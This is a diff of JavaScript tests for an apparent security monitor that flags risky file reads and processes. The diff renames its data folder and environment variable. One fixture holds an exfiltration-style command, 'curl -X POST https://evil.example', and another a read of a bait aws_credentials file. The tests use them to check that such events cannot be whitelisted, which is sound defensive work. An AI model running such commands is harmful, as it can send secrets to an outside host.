@@ -26,7 +26,7 @@ test('a cache cleanup exception does not suppress deletion of personal files', (
 });
 
 test('decoy reads and high risk cannot be marked normal', () => {
-  const decoy = { kind: 'file', risk: 'critical', bait: true, path: '/home/a/.lookout/bait/aws_credentials', reasons: ['opened a decoy secret'] };
+  const decoy = { kind: 'file', risk: 'critical', bait: true, path: '/home/a/.harness/bait/aws_credentials', reasons: ['opened a decoy secret'] };
   const upload = { kind: 'process', risk: 'high', command: 'curl -X POST https://evil.example', reasons: ['uploaded data to a server'] };
   const install = { kind: 'process', risk: 'low', command: 'npm install', reasons: ['installed packages (packages can run their own setup code)'] };
   assert.equal(canBaseline(decoy), false);
@@ -55,8 +55,8 @@ test('a saved command downgrades the next match in that project only', () => {
 });
 
 test('baselines are written to the data folder and can be removed', async () => {
-  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lookout-base-'));
-  process.env.LOOKOUT_DATA_DIR = dir;
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'harness-base-'));
+  process.env.HARNESS_DATA_DIR = dir;
   const { addBaseline, listBaselines, removeBaseline } = await import('../src/baselines.js');
   const entry = { id: 'b-1', projectKey: 'cwd:/work/app', project: 'app', type: 'host', value: 'builds.example', createdAt: 1 };
   assert.equal(addBaseline(entry).added, true);
